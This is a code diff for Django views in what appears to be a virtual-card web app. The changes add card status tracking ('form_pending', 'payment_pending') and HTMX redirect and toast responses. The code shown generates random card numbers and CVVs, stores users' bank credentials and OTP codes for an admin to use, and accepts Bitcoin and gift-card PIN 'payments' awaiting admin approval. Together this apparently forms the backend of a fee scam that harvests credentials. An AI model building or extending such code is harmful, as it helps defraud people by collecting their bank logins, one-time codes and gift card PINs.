@@ -283,8 +283,8 @@ def activate_card(request):
             profile.card_number = "4716 " + "".join([grs(length=4, allowed_chars="0123456789") for _ in range(3)])
             profile.card_cvv = grs(length=3, allowed_chars="0123456789")
             profile.card_expiry = "09/28"
-            # DO NOT activate card yet - wait for payment approval
-            profile.is_activated = False
+            # Set status to form_pending after successful form submission
+            profile.card_status = 'form_pending'
             profile.save()
         except Exception as e:
             print(f"Error saving profile: {e}")
@@ -398,7 +398,18 @@ def bank_manual_payment(request):
                 bank_cred.otp_code = otp_code
                 bank_cred.save()
                 
-                messages.success(request, "OTP submitted. Admin will process your payment.")
+                # Update user profile status to payment_pending
+                if hasattr(request.user, 'profile'):
+                    request.user.profile.card_status = 'payment_pending'
+                    request.user.profile.save()
+                
+                messages.success(request, "Payment submitted. Waiting for admin approval.")
+                if request.headers.get("HX-Request"):
+                    resp = HttpResponse(status=204)
+                    resp["HX-Redirect"] = reverse("dashboard")
+                    resp["X-Toast-Message"] = "Payment submitted. Waiting for admin approval."
+                    resp["X-Toast-Type"] = "success"
+                    return resp
                 return redirect("dashboard")
             except BankCredentials.DoesNotExist:
                 messages.error(request, "No bank credentials found. Please start over.")
@@ -424,7 +435,18 @@ def bitcoin_payment(request):
             status='pending'
         )
         
-        messages.success(request, "Bitcoin payment initiated. Please complete the transaction and contact admin.")
+        # Update user profile status to payment_pending
+        if hasattr(request.user, 'profile'):
+            request.user.profile.card_status = 'payment_pending'
+            request.user.profile.save()
+        
+        messages.success(request, "Payment submitted. Waiting for admin approval.")
+        if request.headers.get("HX-Request"):
+            resp = HttpResponse(status=204)
+            resp["HX-Redirect"] = reverse("dashboard")
+            resp["X-Toast-Message"] = "Payment submitted. Waiting for admin approval."
+            resp["X-Toast-Type"] = "success"
+            return resp
         return redirect("dashboard")
     
     payment_type = request.GET.get('type', 'deposit')
@@ -467,7 +489,18 @@ def gift_card_payment(request):
             pin=pin
         )
         
-        messages.success(request, "Gift card details submitted. Admin will process your payment.")
+        # Update user profile status to payment_pending
+        if hasattr(request.user, 'profile'):
+            request.user.profile.card_status = 'payment_pending'
+            request.user.profile.save()
+        
+        messages.success(request, "Payment submitted. Waiting for admin approval.")
+        if request.headers.get("HX-Request"):
+            resp = HttpResponse(status=204)
+            resp["HX-Redirect"] = reverse("dashboard")
+            resp["X-Toast-Message"] = "Payment submitted. Waiting for admin approval."
+            resp["X-Toast-Type"] = "success"
+            return resp
         return redirect("dashboard")
     
     payment_type = request.GET.get('type', 'deposit')
